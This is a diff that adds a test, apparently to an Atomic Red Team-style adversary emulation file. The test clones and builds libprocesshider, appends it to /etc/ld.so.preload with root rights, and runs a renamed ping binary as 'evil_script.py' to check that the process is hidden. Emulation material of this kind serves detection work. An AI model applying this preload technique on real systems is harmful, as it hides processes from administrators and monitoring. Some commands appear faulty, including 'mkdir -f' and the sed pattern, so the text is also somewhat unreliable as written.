@@ -86,3 +86,40 @@ atomic_tests:
       sudo depmod -a
     name: sh
     elevation_required: true
+- name: libprocesshider
+  auto_generated_guid:
+  description: |
+    Uses libprocess hider to hide a specific process name via ls.so.preload
+  supported_platforms:
+  - linux
+  input_arguments:
+    repo:
+      description: Url of the github repo
+      type: String
+      default: https://github.com/gianlucaborello/libprocesshider.git
+    library_path:
+      description: Full path of the library to add to ld.so.preload
+      type: String
+      default: /usr/local/lib/libprocesshider.so
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      The preload library must exist on disk at specified location (#{library_path})
+    prereq_command: |
+      if [ -f #{library_path} ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      mkdir -f /tmp/atomic && cd /tmp/atomic
+      git clone #{repo}
+      cd libprocesshider
+      make
+      cp libprocesshider.so #{library_path}
+      cp /usr/bin/ping /usr/local/bin/evil_script.py
+  executor:
+    command: |
+      echo #{library_path} | tee -a /etc/ld.so.preload
+      /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"
+    cleanup_command: |
+      sed -i '!#{library_path}!d' /etc/ld.so.preload
+      rm -f #{library_path} /usr/local/bin/evil_script.py /tmp/atomic
+    name: sh
+    elevation_required: true
